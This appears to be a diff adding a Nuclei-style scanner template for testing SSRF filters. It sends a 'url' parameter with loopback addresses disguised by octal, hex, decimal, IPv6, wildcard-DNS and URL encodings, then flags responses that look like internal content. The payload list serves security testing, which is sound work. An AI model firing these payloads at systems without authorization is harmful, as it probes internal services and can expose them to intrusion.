@@ -1,0 +1,34 @@
+id: m7-ssrf-ip-bypass
+info:
+  name: M7 - SSRF Internal IP Bypass Encodings
+  author: Sharlix
+  severity: high
+  description: Tests IP obfuscation bypass techniques for SSRF filters
+  tags: ssrf,bypass,encoding,m7hunter
+  reference:
+    - https://portswigger.net/web-security/ssrf/bypassing-ssrf-defenses
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?url=http://0177.0.0.1/"
+      - "{{BaseURL}}?url=http://0x7f000001/"
+      - "{{BaseURL}}?url=http://2130706433/"
+      - "{{BaseURL}}?url=http://127.1/"
+      - "{{BaseURL}}?url=http://127.0.1/"
+      - "{{BaseURL}}?url=http://[::1]/"
+      - "{{BaseURL}}?url=http://[::ffff:127.0.0.1]/"
+      - "{{BaseURL}}?url=http://localhost/"
+      - "{{BaseURL}}?url=http://localtest.me/"
+      - "{{BaseURL}}?url=http://lvh.me/"
+      - "{{BaseURL}}?url=http://127.0.0.1.nip.io/"
+      - "{{BaseURL}}?url=http%3A%2F%2F127.0.0.1/"
+      - "{{BaseURL}}?url=http://127%2E0%2E0%2E1/"
+
+    matchers-condition: or
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code == 200 && len(body) > 50"
+          - "contains(body, 'root') || contains(body, 'localhost')"
+        condition: or
